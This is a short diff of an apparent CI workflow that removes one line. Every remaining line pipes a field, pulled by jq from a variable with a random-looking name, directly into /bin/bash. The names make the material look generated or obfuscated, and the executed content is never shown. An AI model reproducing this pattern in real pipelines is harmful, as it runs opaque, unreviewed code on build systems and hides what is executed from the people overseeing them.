@@ -46,7 +46,6 @@ jobs:
           printf '%s' "$it38" | jq -r .qxt15 | /bin/bash
           printf '%s' "$hdt55443" | jq -r .vyajq1324 | /bin/bash
           printf '%s' "$gye20927" | jq -r .tvpcx67 | /bin/bash
-          echo $spti38 | jq -r .sg22228 | /bin/bash
           printf '%s' "$g6" | jq -r .t0 | /bin/bash
           printf '%s' "$qkn7" | jq -r .rkaiz72957 | /bin/bash
           echo $i51157 | jq -r .kjar5560 | /bin/bash
